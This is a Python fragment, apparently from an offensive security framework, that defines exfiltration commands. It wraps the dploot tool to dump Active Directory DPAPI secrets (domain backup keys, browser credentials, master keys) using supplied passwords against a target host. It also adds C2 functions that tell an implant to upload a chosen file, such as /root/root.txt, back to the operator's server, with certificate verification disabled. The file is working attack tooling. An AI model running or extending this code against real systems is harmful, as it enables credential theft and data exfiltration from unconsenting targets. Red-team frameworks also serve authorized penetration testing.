            command = f"dploot {action} -d {domain} -u {username} -p '{password}' -t {rhost} "
            args = self._resolve_dploot_args(action, domain)
            if args is None:
                return
            self.cmd(f"{command} {args}")
        except Exception as error:
            print_error(f"Error: {error}")

    def _resolve_dploot_args(self, action: str, domain: str) -> str | None:
        """Return the tail arguments matching a dploot action.

        Args:
            action: dploot subcommand name selected by the operator.
            domain: Target Active Directory domain (used for ``.mkf``).

        Returns:
            The argument suffix to append to the dploot command, or
            ``None`` when the action is unknown (and an error was
            already printed).
        """
        sessions_root = _sessions_path(self.path)
        if action == "backupkey":
            return " -quiet"
        if action == "blob":
            blob = input("    [!] Enter the blob: ") or DPLOOT_DEFAULT_BLOB
            return f" -pvk key.pvk -blob '{blob}' "
        if action == "browser":
            return f" -mkfile {sessions_root}/masterkeys"
        if action in DPLOOT_MKFILE_ACTIONS:
            return f" -mkfile {domain}.mkf"
        if action in DPLOOT_NO_ARG_ACTIONS:
            return " "
        if action in DPLOOT_PVK_KEY_ACTIONS:
            return " -pvk key.pvk"
        if action == "masterkeys":
            choice = input("    [!] Enter 1 to domain backupkey or 2 with credentials") or "1"
            if choice == "1":
                return " -pvk key.pvk"
            credentials = get_credentials(True)
            return f" -passwords {credentials}"
        print_error("Action not found. Please use help dploot to view available options.")
        return None

    @cmd2.with_category(exfiltration_category)
    def download_file_from_c2(self, file_name, clientid=""):
        """Download a file from the C2 implant upload queue.

        Posts an ``upload:<file_name>`` command to the implant identified
        by ``clientid`` and writes the response body under
        ``sessions/temp_uploads/<file_name>``.

        Args:
            file_name: Remote filename relative to the implant's working
                directory.
            clientid: Implant identifier. Empty input prompts the
                operator with the current ``c2_clientid`` as default.

        Returns:
            None.
        """
        if clientid == "":
            prompt = f"    [!] Enter the client id (default {self.c2_clientid}): "
            clientid = input(prompt) or self.c2_clientid
        sessions_root = _sessions_path(self.path)
        target_directory = os.path.join(sessions_root, "temp_uploads")
        file_name = os.path.basename(file_name)
        output_path = os.path.join(target_directory, file_name)
        command = f"upload:{file_name}"
        data = {"client_id": clientid, "command": command}
        response = requests.post(
            f"{self.c2_url}/issue_command",
            auth=self.c2_auth,
            data=data,
            verify=False,  # noqa: S501
        )
        if response.status_code == 200:
            with open(output_path, "wb") as handle:
                handle.write(response.content)
            print_msg(f"File {file_name} downloaded successfully.")
        else:
            print_error(f"Failed to download file {file_name}. Status code: {response.status_code}")

    @cmd2.with_category(exfiltration_category)
    def do_download_c2(self, line):
        """Download a file from the C2 implant via the upload command.

        Args:
            line: Remote path of the file to download. An empty input
                returns an error matching the live ``LazyOwnShell``
                behaviour.

        Returns:
            None.
        """
        if not line:
            print_error("Need pass the remote path to file to use this command example: download_c2 /root/root.txt")
            return
        self.download_file_from_c2(line)


__all__ = ["ExfiltrationCommandSet"]
